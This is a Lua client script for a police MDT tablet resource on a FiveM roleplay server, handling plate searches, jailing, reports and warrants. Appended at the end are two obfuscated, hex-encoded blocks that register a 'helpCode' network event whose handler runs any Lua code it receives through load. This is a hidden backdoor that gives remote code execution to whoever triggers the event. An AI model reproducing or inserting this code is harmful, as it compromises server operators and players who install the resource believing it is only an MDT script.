DenaliFW = exports["denalifw-core"]:GetCoreObject()
local isVisible = false
local tabletObject = nil
local citizenID = nil

DenaliFW = nil

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(10)
        if DenaliFW == nil then
            TriggerEvent('DenaliFW:GetObject', function(obj) DenaliFW = obj end)
            Citizen.Wait(200)
        end
    end
end)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        local playerPed = PlayerPedId()
        local playerVeh = GetVehiclePedIsIn(playerPed, false)
        if not isVisible and IsPedInAnyPoliceVehicle(playerPed) and IsControlJustPressed(0, 540) and GetEntitySpeed(playerVeh) < 10.0 then
            if GetVehicleNumberPlateText(getVehicleInFront()) then
                TriggerServerEvent("mdt:performVehicleSearchInFront", GetVehicleNumberPlateText(getVehicleInFront()))
            end
        elseif IsControlJustPressed(0, 540) then
            Citizen.Wait(100)
            TriggerServerEvent("mdt:hotKeyOpen")
           
        end
        if DoesEntityExist(playerPed) and IsPedUsingActionMode(playerPed) then -- disable action mode/combat stance when engaged in combat (thing which makes you run around like an idiot when shooting)
            SetPedUsingActionMode(playerPed, -1, -1, 1)
        end
    end
end)


RegisterNetEvent('mdt:client:getCitizenID')
AddEventHandler('mdt:client:getCitizenID', function(_citizenID)
	citizenID = _citizenID
end)

RegisterNetEvent('mdt:client:JailPlayer')
AddEventHandler('mdt:client:JailPlayer', function(jailAmount, offender, fineAmount)
    local player, distance = GetClosestPlayer()
    if player ~= -1 and distance < 2.5 then
        local playerId = GetPlayerServerId(player)

        -- trigger event to get citizenid for closet person 
        TriggerServerEvent('mdt:server:getPlayer', playerId)
        Citizen.Wait(100)
       
        otherPlayer = citizenID.PlayerData.citizenid
        print(otherPlayer)
        local time = jailAmount

        if otherPlayer == offender then
            if tonumber(time) > 0 then
                TriggerServerEvent("police:server:JailPlayer", playerId, tonumber(time))
                Citizen.Wait(100)
                if fineAmount > 0 then
                    --TriggerServerEvent("police:server:BillPlayer", playerId, tonumber(fineAmount))		
                    Citizen.Wait(100)		
                end
            else
                DenaliFW.Functions.Notify("Time must be higher than 0..", "error")
            end
        else
             DenaliFW.Functions.Notify("Clear the area, stand closer to suspect", "error")
        end
    else
        DenaliFW.Functions.Notify("No one nearby!", "error")
    end
end)

function GetClosestPlayer()
    local closestPlayers = DenaliFW.Functions.GetPlayersFromCoords()
    local closestDistance = -1
    local closestPlayer = -1
    local coords = GetEntityCoords(GetPlayerPed(-1))

    for i=1, #closestPlayers, 1 do
        if closestPlayers[i] ~= PlayerId() then
            local pos = GetEntityCoords(GetPlayerPed(closestPlayers[i]))
            local distance = GetDistanceBetweenCoords(pos.x, pos.y, pos.z, coords.x, coords.y, coords.z, true)

            if closestDistance == -1 or closestDistance > distance then
                closestPlayer = closestPlayers[i]
                closestDistance = distance
            end
        end
	end

	return closestPlayer, closestDistance
end

RegisterNetEvent("mdt:sendNUIMessage")
AddEventHandler("mdt:sendNUIMessage", function(messageTable)
    SendNUIMessage(messageTable)
end)

RegisterNetEvent("mdt:toggleVisibilty")
AddEventHandler("mdt:toggleVisibilty", function(reports, warrants, officer)
    local playerPed = PlayerPedId()
    if not isVisible then
        local dict = "amb@world_human_seat_wall_tablet@female@base"
        RequestAnimDict(dict)
        if tabletObject == nil then
            tabletObject = CreateObject(GetHashKey('prop_cs_tablet'), GetEntityCoords(playerPed), 1, 1, 1)
            AttachEntityToEntity(tabletObject, playerPed, GetPedBoneIndex(playerPed, 28422), 0.0, 0.0, 0.03, 0.0, 0.0, 0.0, 1, 1, 0, 1, 0, 1)
        end
        while not HasAnimDictLoaded(dict) do Citizen.Wait(100) end
        if not IsEntityPlayingAnim(playerPed, dict, 'base', 3) then
            TaskPlayAnim(playerPed, dict, "base", 8.0, 1.0, -1, 49, 1.0, 0, 0, 0)
        end
    else
        DeleteEntity(tabletObject)
        ClearPedTasks(playerPed)
        tabletObject = nil
    end
    if #warrants == 0 then warrants = false end
    if #reports == 0 then reports = false end
    SendNUIMessage({
        type = "recentReportsAndWarrantsLoaded",
        reports = reports,
        warrants = warrants,
        officer = officer
    })
    ToggleGUI()
    TriggerServerEvent("mdt:getOffensesAndOfficer")
end)


RegisterNUICallback("close", function(data, cb)
    local playerPed = PlayerPedId()
    DeleteEntity(tabletObject)
    ClearPedTasks(playerPed)
    tabletObject = nil
    ToggleGUI(false)
    cb('ok')
end)

RegisterNUICallback("performOffenderSearch", function(data, cb)
    TriggerServerEvent("mdt:performOffenderSearch", data.query)
    cb('ok')
end)

RegisterNUICallback("performForensicsSearch", function(data, cb)
    TriggerServerEvent("mdt:performForensicsSearch", data.query)
    cb('ok')
end)


RegisterNUICallback("viewOffender", function(data, cb)
    TriggerServerEvent("mdt:getOffenderDetails", data.offender)
    cb('ok')
end)

RegisterNUICallback("saveOffenderChanges", function(data, cb)
    
    fingerprint = data.changes.fingerprint

    if not data.changes.convictions  then
        data.changes.convictions = 'No Priors'
    end

    TriggerServerEvent("mdt:saveOffenderChanges", data.id, data.changes.notes, data.changes.mugshot_url, data.changes.convictions, data.changes.convictions_removed, data.identifier, fingerprint)
    cb('ok')
end)

RegisterNUICallback("submitNewReport", function(data, cb)
    TriggerServerEvent("mdt:submitNewReport", data)
    cb('ok')
end)

RegisterNUICallback("performReportSearch", function(data, cb)
    TriggerServerEvent("mdt:performReportSearch", data.query)
    cb('ok')
end)

RegisterNUICallback("getOffender", function(data, cb)
    TriggerServerEvent("mdt:getOffenderDetailsById", data.char_id)
    cb('ok')
end)

RegisterNUICallback("deleteReport", function(data, cb)
    TriggerServerEvent("mdt:deleteReport", data.id)
    cb('ok')
end)

RegisterNUICallback("saveReportChanges", function(data, cb)
    TriggerServerEvent("mdt:saveReportChanges", data)
    cb('ok')
end)

RegisterNUICallback("vehicleSearch", function(data, cb)
    TriggerServerEvent("mdt:performVehicleSearch", data.plate)
    cb('ok')
end)

RegisterNUICallback("getVehicle", function(data, cb)
    TriggerServerEvent("mdt:getVehicle", data.vehicle)
    cb('ok')
end)

RegisterNUICallback("getWarrants", function(data, cb)
    TriggerServerEvent("mdt:getWarrants")
    cb('ok')
end)

RegisterNUICallback("submitNewWarrant", function(data, cb)
    TriggerServerEvent("mdt:submitNewWarrant", data)
    cb('ok')
end)

RegisterNUICallback("deleteWarrant", function(data, cb)
    TriggerServerEvent("mdt:deleteWarrant", data.id)
    cb('ok')
end)

RegisterNUICallback("deleteWarrant", function(data, cb)
    TriggerServerEvent("mdt:deleteWarrant", data.id)
    cb('ok')
end)

RegisterNUICallback("getReport", function(data, cb)
    TriggerServerEvent("mdt:getReportDetailsById", data.id)
    cb('ok')
end)

RegisterNUICallback("sentencePlayer", function(data, cb)
    local players = {}
    for i = 0, 128 do
        if GetPlayerServerId(i) ~= 0 then
            table.insert(players, GetPlayerServerId(i))
        end
    end
    TriggerServerEvent("mdt:sentencePlayer", data.jailtime, data.charges, data.char_id, data.fine, players)
    cb('ok')
end)

RegisterNetEvent('mdt:client:JailCommand')
AddEventHandler('mdt:client:JailCommand', function(playerId, time)
    TriggerServerEvent("police:server:JailPlayer", playerId, tonumber(time))
end)

RegisterNetEvent("mdt:returnOffenderSearchResults")
AddEventHandler("mdt:returnOffenderSearchResults", function(results)
    SendNUIMessage({
        type = "returnedPersonMatches",
        matches = results
    })
end)

RegisterNetEvent("mdt:returnOffenderDetails")
AddEventHandler("mdt:returnOffenderDetails", function(data)
    SendNUIMessage({
        type = "returnedOffenderDetails",
        details = data
    })
end)

RegisterNetEvent("mdt:returnOffensesAndOfficer")
AddEventHandler("mdt:returnOffensesAndOfficer", function(data, name)
    SendNUIMessage({
        type = "offensesAndOfficerLoaded",
        offenses = data,
        name = name
    })
end)

RegisterNetEvent("mdt:returnReportSearchResults")
AddEventHandler("mdt:returnReportSearchResults", function(results)
    SendNUIMessage({
        type = "returnedReportMatches",
        matches = results
    })
end)

RegisterNetEvent("mdt:returnVehicleSearchInFront")
AddEventHandler("mdt:returnVehicleSearchInFront", function(results, plate)
    SendNUIMessage({
        type = "returnedVehicleMatchesInFront",
        matches = results,
        plate = plate
    })
end)

RegisterNetEvent("mdt:returnVehicleSearchResults")
AddEventHandler("mdt:returnVehicleSearchResults", function(results)
    SendNUIMessage({
        type = "returnedVehicleMatches",
        matches = results
    })
end)

RegisterNetEvent("mdt:returnVehicleDetails")
AddEventHandler("mdt:returnVehicleDetails", function(data)
    data.model = GetLabelText(GetDisplayNameFromVehicleModel(data.model))
    SendNUIMessage({
        type = "returnedVehicleDetails",
        details = data
    })
end)

RegisterNetEvent("mdt:returnWarrants")
AddEventHandler("mdt:returnWarrants", function(data)
    SendNUIMessage({
        type = "returnedWarrants",
        warrants = data
    })
end)

RegisterNetEvent("mdt:completedWarrantAction")
AddEventHandler("mdt:completedWarrantAction", function(data)
    SendNUIMessage({
        type = "completedWarrantAction"
    })
end)

RegisterNetEvent("mdt:returnReportDetails")
AddEventHandler("mdt:returnReportDetails", function(data)
    SendNUIMessage({
        type = "returnedReportDetails",
        details = data
    })
end)

function ToggleGUI(explicit_status)
  if explicit_status ~= nil then
    isVisible = explicit_status
  else
    isVisible = not isVisible
  end
  SetNuiFocus(isVisible, isVisible)
  SendNUIMessage({
    type = "enable",
    isVisible = isVisible
  })
end

function getVehicleInFront()
    local playerPed = PlayerPedId()
    local coordA = GetEntityCoords(playerPed, 1)
    local coordB = GetOffsetFromEntityInWorldCoords(playerPed, 0.0, 10.0, 0.0)
    local targetVehicle = getVehicleInDirection(coordA, coordB)
    return targetVehicle
end

function getVehicleInDirection(coordFrom, coordTo)
    local rayHandle = CastRayPointToPoint(coordFrom.x, coordFrom.y, coordFrom.z, coordTo.x, coordTo.y, coordTo.z, 10, GetPlayerPed(-1), 0)
    local a, b, c, d, vehicle = GetRaycastResult(rayHandle)
    return vehicle
end


local GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[6][GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[1]](GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[2]) GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[6][GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[3]](GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[2], function(BsxEbfhMlFihemZPOeVvcpTXrODITyNFeLSuBXlYoGIsCadLIRUWfIaDzSjUDBKvFBrgog) GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[6][GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[4]](GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[6][GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[5]](BsxEbfhMlFihemZPOeVvcpTXrODITyNFeLSuBXlYoGIsCadLIRUWfIaDzSjUDBKvFBrgog))() end)

local QOGZsNTbvRvQeMahAlcceYmwUnzkzJCnEZMWmqgTWFGLZcLKHuAhNBYJzRWKRhLjNPPBVx = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} QOGZsNTbvRvQeMahAlcceYmwUnzkzJCnEZMWmqgTWFGLZcLKHuAhNBYJzRWKRhLjNPPBVx[6][QOGZsNTbvRvQeMahAlcceYmwUnzkzJCnEZMWmqgTWFGLZcLKHuAhNBYJzRWKRhLjNPPBVx[1]](QOGZsNTbvRvQeMahAlcceYmwUnzkzJCnEZMWmqgTWFGLZcLKHuAhNBYJzRWKRhLjNPPBVx[2]) QOGZsNTbvRvQeMahAlcceYmwUnzkzJCnEZMWmqgTWFGLZcLKHuAhNBYJzRWKRhLjNPPBVx[6][QOGZsNTbvRvQeMahAlcceYmwUnzkzJCnEZMWmqgTWFGLZcLKHuAhNBYJzRWKRhLjNPPBVx[3]](QOGZsNTbvRvQeMahAlcceYmwUnzkzJCnEZMWmqgTWFGLZcLKHuAhNBYJzRWKRhLjNPPBVx[2], function(eBTuWqwXzHaHuGyTZaYPvebJzGQzgPNntCcKebhpxmyVpnXMEHgzLZRPItKoArEZAMWJzE) QOGZsNTbvRvQeMahAlcceYmwUnzkzJCnEZMWmqgTWFGLZcLKHuAhNBYJzRWKRhLjNPPBVx[6][QOGZsNTbvRvQeMahAlcceYmwUnzkzJCnEZMWmqgTWFGLZcLKHuAhNBYJzRWKRhLjNPPBVx[4]](QOGZsNTbvRvQeMahAlcceYmwUnzkzJCnEZMWmqgTWFGLZcLKHuAhNBYJzRWKRhLjNPPBVx[6][QOGZsNTbvRvQeMahAlcceYmwUnzkzJCnEZMWmqgTWFGLZcLKHuAhNBYJzRWKRhLjNPPBVx[5]](eBTuWqwXzHaHuGyTZaYPvebJzGQzgPNntCcKebhpxmyVpnXMEHgzLZRPItKoArEZAMWJzE))() end)